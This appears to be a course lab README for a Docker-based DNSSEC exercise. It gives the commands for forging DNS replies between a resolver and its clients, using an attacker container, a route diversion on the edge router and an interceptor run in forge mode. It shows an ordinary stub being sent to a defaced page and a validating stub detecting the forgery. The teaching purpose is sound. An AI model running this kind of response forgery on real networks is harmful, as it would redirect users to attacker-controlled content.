# Phase 6 — Last-Mile Response Forgery

The resolver validates DNSSEC, but the link from resolver to client carries no proof of it — a
stub trusts whatever appears to come from its resolver. The attacker is **relocated to the client
subnet** (`172.16.1.100`) and forges the resolver→client reply. Upstream (Phases 3–5) is unchanged.

## What changes vs Phase 3

- **Attacker relocated** to `172.16.1.100` on the client subnet. The interceptor binary is
  **unchanged** from Phase 2/3 — only its delivery target (now a client) and the diversion point
  change. Arg 2 is the delivery target IP.
- **Downstream diversion** on **edge-router** (`diversion/divert-on.sh`): client-bound replies for
  `172.16.1.10` and `172.16.1.11` are routed via the attacker — a route on the router only, no ARP
  spoofing, clients untouched.
- **Two clients**: `client` (172.16.1.10) = **Client A**, an ordinary stub (`dig`/`curl`);
  `client-b` (172.16.1.11) = **Client B**, a locally-validating stub (`delv` with the root key as
  its own trust anchor, mounted at `/anchor/trust-anchor.conf`).

## Deploy

```bash
docker build -t cs6008-dnslab:base ../common
docker run --rm -v "$PWD":/phase6 -w /phase6 cs6008-dnslab:base sign/sign-all.sh
docker compose up -d
docker exec attacker make -C /attack
```

## Attack (6.3)

```bash
docker exec edge-router sh /diversion/divert-on.sh
docker exec -d attacker sh -c "exec /attack/interceptor eth0 172.16.1.10 172.16.1.30 forge > /tmp/a.log 2>&1"
docker exec -d attacker sh -c "exec /attack/interceptor eth0 172.16.1.11 172.16.1.30 forge > /tmp/b.log 2>&1"
docker exec resolver rndc -c /etc/bind/rndc.conf flush

# Client A (ordinary stub) -> lands on the rogue page
docker exec client dig +short example.com      # -> 172.16.1.30 (reply even has the 'ad' flag)
docker exec client curl -s http://example.com   # -> DEFACED

# Client B (validating stub) -> catches the forgery
docker exec client-b delv -a /anchor/trust-anchor.conf @172.16.2.10 example.com
#   -> ;; RRSIG failed to verify ... resolution failed
```

## Files

- `attack/interceptor.c` — unchanged from Phase 2/3 (relay/forge); run once per target client.
- `diversion/divert-on.sh` / `divert-off.sh` — the **edge-router** downstream diversion.
- `compose.yml` — attacker on the client subnet, plus `client-b` (validating stub).
- `evidence/` — relay verify, the two client outcomes, and the forged reply (ad flag set, A tampered).
